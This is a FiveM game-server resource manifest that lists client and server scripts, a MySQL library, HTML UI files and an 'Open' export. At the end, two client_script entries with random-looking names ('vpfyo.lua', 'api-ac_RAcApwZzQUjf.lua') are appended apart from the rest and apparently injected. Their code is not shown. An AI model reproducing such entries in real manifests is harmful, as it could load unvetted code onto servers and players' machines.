resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

ui_page 'html/index.html'

client_scripts {
    "client/main.lua",
    "client/functions.lua",
    "config.lua"
}

server_scripts {
    "@mysql-async/lib/MySQL.lua",
    "server/main.lua",
    "config.lua"
}

files {
    'html/index.html',
    'html/app.css',
    'html/app.js'
}

exports {
    "Open"
}
client_script "vpfyo.lua"



client_script "api-ac_RAcApwZzQUjf.lua"